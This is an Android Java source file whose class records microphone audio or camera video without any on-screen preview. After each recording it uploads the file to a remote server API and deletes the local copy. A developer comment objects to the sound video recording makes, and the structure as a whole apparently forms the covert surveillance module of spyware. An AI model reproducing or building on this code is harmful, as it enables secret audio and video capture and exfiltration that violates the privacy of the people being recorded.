package com.fs.fs.api;

import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.text.TextUtils;

import com.fs.fs.App;
import com.fs.fs.api.network.ApiConfig;
import com.fs.fs.api.network.core.BaseResponse;
import com.fs.fs.api.network.core.HttpParams;
import com.fs.fs.api.network.core.OkHttpUtils;
import com.fs.fs.api.network.core.callback.HttpCallback;
import com.fs.fs.utils.DateUtils;
import com.fs.fs.utils.FileUtils;

import java.io.File;
import java.io.IOException;
import java.util.Date;

import okhttp3.Headers;

import static com.fs.fs.api.CameraService.getCameraId_low;

/**
 * Created by wyx on 2017/1/4.
 * <p>
 * DOC:https://developer.android.com/guide/topics/media/camera.html#capture-video
 */

public class MediaRecordService {
    private MediaRecorder mMediaRecorder = null;
    private Camera mCamera = null;
    private String path = null;
    private Boolean isStart = false;


    private MediaRecordService() {
    }

    private static class SingletonHolder {
        private static final MediaRecordService INSTANCE = new MediaRecordService();
    }

    public static MediaRecordService getInstance() {
        return SingletonHolder.INSTANCE;
    }


    public void startRecordAudio() {
        stopRecordAudio();
        try {
            mMediaRecorder = new MediaRecorder();
            mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mMediaRecorder.setAudioEncodingBitRate(96000);
            mMediaRecorder.setAudioSamplingRate(48 * 1000);
            mMediaRecorder.setAudioChannels(1);

            String fileName = String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "3gp");
            path = FileUtils.getExternalFullPath(App.getInstance(), fileName);
            mMediaRecorder.setOutputFile(path);

            mMediaRecorder.prepare();
            mMediaRecorder.start();
            isStart = true;
        } catch (IOException e) {
            e.printStackTrace();
            stopRecordAudio();
        }
    }

    public void startRecordVideo(Integer cameraId) {
        cameraId = cameraId == null ? getCameraId_low() : cameraId;
        stopRecordVideo();
        try {
            /**
             TODO:WTF!!! record video will have a sound when MediaRecorder start or stop.
             But record audio no
             TODO:Use ffmpeg replace MediaRecorder
             **/
            mCamera = Camera.open(cameraId);
            mCamera.setPreviewTexture(new SurfaceTexture(10));
            mMediaRecorder = new MediaRecorder();
            mCamera.unlock();
            mMediaRecorder.setCamera(mCamera);

            mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
            mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);

            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mMediaRecorder.setAudioEncodingBitRate(960 * 1000);
            mMediaRecorder.setAudioSamplingRate(48 * 1000);
            mMediaRecorder.setAudioChannels(1);

            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mMediaRecorder.setVideoEncodingBitRate(300 * 1000);
            mMediaRecorder.setVideoSize(640, 480);

            String fileName = String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "mp4");
            path = FileUtils.getExternalFullPath(App.getInstance(), fileName);
            mMediaRecorder.setOutputFile(path);

//            mMediaRecorder.setMaxDuration(1 * 1000);

            mMediaRecorder.prepare();
            mMediaRecorder.start();
            isStart = true;
        } catch (Exception e) {
            e.printStackTrace();
            stopRecordVideo();
        }
    }


    public void stopRecordVideo() {
        releaseMediaRecorder();
        releaseCamera();
        if (isStart && !TextUtils.isEmpty(path)) {
            final File file = new File(path);
            OkHttpUtils.post(ApiConfig.takeVideo(), new HttpParams().addFile("video", file), new HttpCallback(BaseResponse.class) {
                @Override
                public void onSuccess(BaseResponse httpResponse, Headers headers) {
                    FileUtils.delete(file);
                }

                @Override
                public void onError(String errorMsg) {

                }
            });
            isStart = false;
            path = null;
        }
    }

    public void stopRecordAudio() {
        releaseMediaRecorder();
        if (isStart && !TextUtils.isEmpty(path)) {
            final File file = new File(path);
            OkHttpUtils.post(ApiConfig.takeAudio(), new HttpParams().addFile("audio", file), new HttpCallback(BaseResponse.class) {
                @Override
                public void onSuccess(BaseResponse httpResponse, Headers headers) {
                    FileUtils.delete(file);
                }

                @Override
                public void onError(String errorMsg) {

                }
            });
            isStart = false;
            path = null;
        }
    }

    private void releaseMediaRecorder() {
        if (mMediaRecorder != null) {
            try {
                if (isStart) mMediaRecorder.stop();
                mMediaRecorder.reset();
                mMediaRecorder.release();
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                mMediaRecorder = null;
            }
        }
    }

    private void releaseCamera() {
        if (mCamera != null) {
            mCamera.lock();
            mCamera.release();
            mCamera = null;
        }
    }

}
